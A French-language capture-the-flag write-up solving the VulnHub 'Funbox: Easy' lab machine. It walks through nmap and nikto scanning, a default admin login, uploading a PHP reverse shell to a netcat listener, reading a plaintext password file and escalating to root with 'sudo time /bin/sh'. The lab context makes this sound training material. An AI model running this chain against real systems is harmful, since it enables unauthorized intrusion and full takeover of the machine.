---
title: "CTF Funbox: Easy"
date: 2021-04-25
tags: ["Pentest", "CTF"]
download: https://www.vulnhub.com/entry/funbox-easy,526
parts:
  - title: "CTF Funbox: Easy"
  - title: "CTF Funbox: Script Kiddie"
    href: "ctf-funbox-script-kiddie"
---

## Avant propos

Le déroulé de ce hack a été réalisé sur une machine prévue à cette effet. Il est interdit de mener ce genre d'action sur une machine qui ne vous appartient pas sans l'accord de son ou sa propriétaire.  
Ce CTF a été réalisé avec une machine attaquante **Kali 2021.1** (`lsb_release -r`).

## Enumération

On récupère l'adresse IP de la machine distante avec **Netdiscover** `sudo netdiscover`.  
Avant de poursuivre, on exporte cette adresse dans une variable pour être tranquille par la suite `export IP=192.168.1.58`.  
Puis on créé un dossier dédié à ce CTF `cd Documents/ctf && mkdir FunboxEasy && cd FunboxEasy`.  
On lance **Nmap** pour scanner les ports de la machine distante.

```bash
$ nmap -sV -sT -p- $IP -oN nmap.txt
Nmap scan report for funbox3.home (192.168.1.58)
Host is up (0.00052s latency).
Not shown: 65532 closed ports
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http    Apache httpd 2.4.41 ((Ubuntu))
33060/tcp open  mysqlx?
```

On a un serveur **SSH** sur le port **22** , un serveur **Apache 2** sur le port **80** et un serveur **MySQL** sur le port **33060**.

Astuce : vous pouvez ajouter le domaine _funbox3.home_ dans le fichier `/etc/hosts` avec **Vim** (ou un autre éditeur de texte).

```bash
$ sudo vim /etc/hosts
192.168.1.58    funbox3.home
```

Scannons le port **80** avec **Nikto** pour avoir d'eventuelles informations sur la sécurité du serveur.

```bash
$ nikto -h http://$IP -o nikto.txt
+ Server: Apache/2.4.41 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Cookie PHPSESSID created without the httponly flag
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ "robots.txt" contains 1 entry which should be manually viewed.
+ Multiple index files found: /index.html, /index.php
+ Server may leak inodes via ETags, header found with file /, inode: 2aa6, size: 5abac58e39aeb, mtime: gzip
+ Allowed HTTP Methods: OPTIONS, HEAD, GET, POST
+ OSVDB-3092: /admin/: This might be interesting...
+ OSVDB-3092: /secret/: This might be interesting...
+ OSVDB-3092: /store/: This might be interesting...
+ OSVDB-3093: /admin/index.php: This might be interesting... has been seen in web logs from an unknown scanner.
```

Sur la page [/store](http://funbox3.home/store), en bas il y a un lien "Admin login" qui amène sur [/store/admin.php](http://funbox3.home/store/admin.php) et en essayant avec "admin:admin", ça passe du premier coup. En cliquant sur "Add new book", on peut uploader un fichier quelconque. On prépare donc un webshell en PHP.

```bash
$ cp /usr/share/webshells/php/php-reverse-shell.php .
$ vim php-reverse-shell.php
/$ip
```

Puis on lance un serveur **Netcat** sur le port **1234** (ou celui de votre choix) `nc -lnvp 1234`.

En cherchant où les fichiers sont uploadés, on trouve le lien du répertoire [/store/bootstrap/img](http://funbox3.home/store/bootstrap/img). On clique sur notre webshell afin de l'exécuter.

## Pénétration

Dans le terminal avec **Netcat**, la connexion avec le serveur est établi.

```bash
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

En remontant dans le répertoire "/home", on découvre un utilisateur "tony" avec un fichier "password.txt".

```bash
$ cat /home/tony/password.txt
ssh: yxcvbnmYYY
gym/admin: asdfghjklXXX
/store: admin@admin.com admin
```

On tente la connexion SSH.

```bash
$ ssh tony@localhost
tony@localhost's password: yxcvbnmYYY
```

## Escalation

On regarde les privilèges que possèdent cet utilisateur.

```bash
$ sudo -l
User tony may run the following commands on funbox3:
(root) NOPASSWD: /usr/bin/yelp
(root) NOPASSWD: /usr/bin/dmf
(root) NOPASSWD: /usr/bin/whois
(root) NOPASSWD: /usr/bin/rlogin
(root) NOPASSWD: /usr/bin/pkexec
(root) NOPASSWD: /usr/bin/mtr
(root) NOPASSWD: /usr/bin/finger
(root) NOPASSWD: /usr/bin/time
(root) NOPASSWD: /usr/bin/cancel
(root) NOPASSWD:
/root/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/q/r/s/t/u/v/w/x/y/z/.smile.sh
```

Sur [GTFOBins](https://gtfobins.github.io/gtfobins/time/#sudo), on regarde quelle commande permet d'utiliser la commande "time" en tant que "sudo" dans le terminal.

```bash
sudo /usr/bin/time /bin/sh
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
id
uid=0(root) gid=0(root) groups=0(root)
```

Dans le répertoire de l'utilisateur "root", on trouve le flag dans le fichier "root.flag" `cat /root/root.flag`.
